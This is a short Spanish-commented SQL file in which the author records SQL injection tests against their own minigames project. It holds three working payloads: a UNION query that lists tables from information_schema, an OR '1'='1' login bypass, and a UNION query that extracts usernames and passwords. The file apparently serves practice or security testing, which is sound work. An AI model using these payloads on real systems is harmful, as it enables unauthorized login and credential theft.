/*
    Archivo de Pruebas SQL - Inyección SQL
    Proyecto: Minijuegos
    
    Aquí guardo las consultas que he ido probando.
*/

-- 1. Prueba INFORMATION_SCHEMA
-- Mi Objetivo: Listar tablas de la base de datos (mostrándolas en la columna Nombre)
-- Formulario donde lo he probado: Buscador
SELECT * 
FROM minijuego 
WHERE nombre LIKE '%' 
UNION 
SELECT null, table_name, null, null, null 
FROM information_schema.tables 
WHERE table_schema = 'minijuegos_db' -- %';

-- 2. Prueba Login Bypass
-- Mi Objetivo: Hacer login sin contraseña (haciendo que sea siempre verdadero)
-- Formulario donde lo he probado: Login
SELECT * 
FROM usuarios 
WHERE usuario = '' OR '1'='1' AND password = '' OR '1'='1';

-- 3. Prueba Obtención de Datos
-- Mi Objetivo: Extraer usuarios y contraseñas (mostrándolos en Nombre y Categoría/Descripción)
-- Formulario donde lo he probado: Buscador
SELECT * 
FROM minijuego 
WHERE nombre LIKE '%' 
UNION SELECT null, usuario, password, null, null FROM usuarios -- %';
